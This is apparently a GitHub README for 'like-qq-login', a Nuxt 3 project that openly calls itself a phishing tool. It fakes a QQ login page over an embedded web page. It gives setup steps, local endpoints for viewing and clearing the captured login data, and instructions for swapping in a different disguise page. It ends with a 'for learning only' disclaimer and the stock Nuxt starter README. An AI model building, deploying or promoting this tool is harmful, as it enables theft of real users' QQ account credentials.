# like-qq-login

## 作用
钓鱼

## 效果

![4554fb731b9d71a68a85dd27d4d5943](https://user-images.githubusercontent.com/32216292/200274398-75c675b8-0fc7-4483-ac7e-117d53795214.jpg)

![d2b978f13e6a0c6169750a61f9e5893](https://user-images.githubusercontent.com/32216292/200274473-10125dae-b21e-4324-b6d0-35ef6e6d3e42.png)

![b69b1f37e371516e32e8a22ee961f4a](https://user-images.githubusercontent.com/32216292/200274545-4af6962d-90a3-4884-8a56-f618e5b9083c.jpg)

## 获取钓到的数据
```
// 请根据您实际的地址来，在浏览器访问
localhost:3000/qop/show
```
![b69b1f37e371516e32e8a22ee961f4a](https://user-images.githubusercontent.com/32216292/200274545-4af6962d-90a3-4884-8a56-f618e5b9083c.jpg)
## 清空钓到的数据
```
// 请根据您实际的地址来，在浏览器访问
localhost:3000/qop/delete
```

## 改变背景
```
// pages/index.vue 找到
<embed v-if="loadEmbed" src="/game.html" width="100%" class="h-screen"/>

// 换成你需要套的网页
<embed v-if="loadEmbed" src="http://youself.site" width="100%" class="h-screen"/>
```

## 声明
仅供学习参考


# Nuxt 3 Minimal Starter

Look at the [nuxt 3 documentation](https://v3.nuxtjs.org) to learn more.

## Setup

Make sure to install the dependencies:

```bash
# yarn
yarn install

# npm
npm install

# pnpm
pnpm install --shamefully-hoist
```

## Development Server

Start the development server on http://localhost:3000

```bash
npm run dev
```

## Production

Build the application for production:

```bash
npm run build
```

Locally preview production build:

```bash
npm run preview
```

Checkout the [deployment documentation](https://v3.nuxtjs.org/guide/deploy/presets) for more information.
